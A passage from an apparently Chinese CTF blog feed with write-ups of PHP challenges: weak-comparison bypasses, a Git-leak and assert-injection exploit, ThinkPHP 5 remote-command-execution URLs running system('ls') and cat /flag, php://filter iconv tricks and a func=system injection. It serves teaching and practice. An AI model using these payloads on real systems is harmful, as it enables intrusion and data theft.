class="hljs-string">&#x27;123a&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123 &#x27;</span>));<span class="hljs-comment">//flase</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//in_array()函数：用于检查一个值是否存在于数组中。</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br>参数说明：<br><br>    <span class="hljs-variable">$value</span>：要检查的值。<br>    <span class="hljs-variable">$array</span>：要搜索的数组。<br>    <span class="hljs-variable">$strict</span>（可选）：指定是否进行严格的类型检查，默认为 <span class="hljs-literal">false</span>。如果设置为 <span class="hljs-literal">true</span>，则不仅要比较值，还要比较数据类型。<br><br>该函数会遍历数组中的每个元素，并与要检查的值进行比较。如果找到匹配的值，则返回 <span class="hljs-literal">true</span>，否则返回 <span class="hljs-literal">false</span>。<br>    问题出在<span class="hljs-variable">$strict</span>参数，弱不设置则为弱比较，绕过方法见上。    <br></code></pre></td></tr></table></figure><p>还在师傅们的文章上看到这么一个东西：<code>preg_match</code>与intval配合使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错</span><br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;oh you find me！&#x27;</span>；<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?num[]=1,传个数组可以绕过die，然后Intval数组会报错返回1，从而echo flag。</span><br><br></code></pre></td></tr></table></figure><p>类似的还有array_search()函数：用于在数组中搜索指定的值，并返回该值对应的键（即数组中的索引位置）。语法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    $value：要搜索的值。</span><br><span class="hljs-comment">    $array：要搜索的数组。</span><br><span class="hljs-comment">    $strict（可选）：指定是否进行严格的类型检查，默认为 false。如果设置为 true，则不仅要比较值，还要比较数据类型。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">该函数会遍历数组中的每个元素，并与要搜索的值进行比较。如果找到匹配的值，则返回该值对应的键；如果找不到匹配的值，则返回 false。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>​    这个函数的例题可以参考攻防世界中的easyphp。</p><p>参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_47804678/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">128814377</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_48108919/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">123279251</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>c53f7af34ee2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界做题记录_1</title>
    <link href="/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
    <url>/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><hr><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>进入环境:<br><img src="/img/b5.png" alt="b5"><br>点下上面的链接看看结果About：<br><img src="/img/b6.png" alt="b6"><br>里面有个Git,想到了Git泄露,直接看下.git文件有没有：<br><img src="/img/b7.png" alt="b7"><br>上GitHack：<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" alt="b8"><br>访问一下，看有没有啥好东西：<br>flag.php里啥也没有，可惜：<br><img src="/img/b9.png" alt="b9"><br>看下index.php,里面有不少好东西，把有用的php部分拿出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先GET方式传page，不给page赋值的话自动等于home(就是我们进去看到的首页)，然后进行一个拼接：templates&#x2F;$page.php，把这东西给$file。assert这东西叫“断言检查”，意思是如果里面的条件是真，就会接着执行后面的函数require_once，这东西有点点像include包含，至于直接包含某个文件，不用伪协议啥的我一直把它理解成执行该文件，哈哈。<br>接下来的思路就是构造page让他执行一些命令比如’ls’ ‘cat’啥的。<br>接下来的payload参考了这位师傅的文章，感谢！：<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>解释下为什么要给page赋这么一个值，先看这个page让file成了个啥东西：<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>带到断言函数中：<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p><p>strpos函数是看参数里有没有要检测的值，有的话返回第一次出现的位置，没有就返回false。明显 ‘template&#x2F;flag’这里面没abc，第一个assert为真；第二个执行 cat templates&#x2F;flag.php ，这没啥好说的，就是去拿我们要的flag，不过注意cat后的文件路径。我们当前在index.php下，index.php和templates同目录，flag.php又在templates下。所以相对路径就是<code>templates/flag.php</code>。最后一个断言是找flag.php中有没有俩点，没有返回false。因为是两个and连接，三个条件都为真即为真。然后直接require($file)，执行命令。<br>flag藏在源码里：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" alt="image"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" alt="image"><br>Github搜下有关这个ThinkPHPV5的相关漏洞，发现有一大堆远程命令执行的POC：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" alt="image"><br>找个长的试试：<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>执行了phpinfo()这个命令<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" alt="image"><br>ls看下当前目录下的文件：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" alt="image"><br>没有和flag有关的东西，等会用find找一下，不过这里有个和爬虫有关的robots.txt，让我看看你：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" alt="image"><br>可惜啥也没有，find命令找下和flag有关的东西：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>find是全磁盘查找所以可能会比较慢：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" alt="image"><br>草了，还是看看根目录下都啥东西吧：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" alt="image"><br>有个flag: ls &#x2F;flag没啥有价值的东西，直接 cat &#x2F;flag读一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" alt="image"></p><h2 id="题目名称-文件包含"><a href="#题目名称-文件包含" class="headerlink" title="题目名称-文件包含"></a><strong>题目名称-文件包含</strong></h2><h2 id="进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb"><a href="#进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert.iconv.UTF-8*.UCS-4BE.resource=./check.php这种类型的过滤器，那就试试这个：?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:[网鼎杯 2020 朱雀组]phpweb"></a>进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" alt="image"><br>回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>这种类型的过滤器，那就试试这个：<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" alt="image"><br>过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-mac（别名：MacJapanese）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO（别名：SJIS-DOCOMO）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDI（别名：SJIS-KDDI）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO（别名：UTF-<span class="hljs-number">8</span>-DOCOMO）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B（别名：UTF-<span class="hljs-number">8</span>-KDDI）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK（别名：UTF-<span class="hljs-number">8</span>-SOFTBANK）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI（别名：ISO-<span class="hljs-number">2022</span>-JP-KDDI）<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIES（别名：HTML）<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>（别名：CP949）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>（别名：CP1251）<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>（别名：CP1252）<br>    <span class="hljs-attribute">CP866</span>（别名：IBM866）<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>（别名：ArmSCII8<br></code></pre></td></tr></table></figure><br>直接去翻了wp。。感谢这位师傅：<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" alt="image"><br>根据长度排列一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" alt="image"><br>拿到flag：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" alt="image"><br>最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xx（信息性状态码）：表示请求已被接收，继续处理。<br>   <span class="hljs-number"> 100 </span>Continue：服务器已接收到请求的初始部分，客户端应继续发送剩余部分。<br>   <span class="hljs-number"> 101 </span>Switching Protocols：服务器已理解并接受客户端的请求，将切换到新的协议。<br><br>2xx（成功状态码）：表示请求已成功被服务器接收、理解和处理。<br>   <span class="hljs-number"> 200 </span>OK：请求成功，服务器返回请求的内容。<br>   <span class="hljs-number"> 201 </span>Created：请求成功，服务器创建了新资源。<br>   <span class="hljs-number"> 204 </span>No Content：请求成功，服务器处理成功，但没有返回任何内容。<br><br>3xx（重定向状态码）：表示需要进一步操作以完成请求。<br>   <span class="hljs-number"> 301 </span>Moved Permanently：请求的资源已永久移动到新位置。<br>   <span class="hljs-number"> 302 </span>Found：请求的资源临时移动到新位置。<br>   <span class="hljs-number"> 304 </span>Not Modified：资源未修改，客户端可以使用缓存的版本。<br><br>4xx（客户端错误状态码）：表示客户端发送的请求有错误。<br>   <span class="hljs-number"> 400 </span>Bad Request：请求无效，服务器无法理解。<br>   <span class="hljs-number"> 401 </span>Unauthorized：请求要求身份验证。<br>   <span class="hljs-number"> 404 </span>Not Found：请求的资源不存在。<br><br>5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。<br>   <span class="hljs-number"> 500 </span>Internal Server Error：服务器遇到了意外错误。<br>   <span class="hljs-number"> 502 </span>Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效响应。<br>   <span class="hljs-number"> 503 </span>Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。<br></code></pre></td></tr></table></figure><br><strong>[网鼎杯 2020 朱雀组]phpweb</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" alt="image"><br>没啥特别的。。不过这页面没过几秒就会刷新一下，出现下面这种东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" alt="image"><br>他说某个和data有关的函数设置有问题?右键看下源码有啥东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" alt="image"><br>burpsuite抓下包看看：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" alt="image"><br>下面有个这个东西：<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>前面是个函数？后面是他的参数？看着像命令执行，改成system(‘ls’)看看效果：<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" 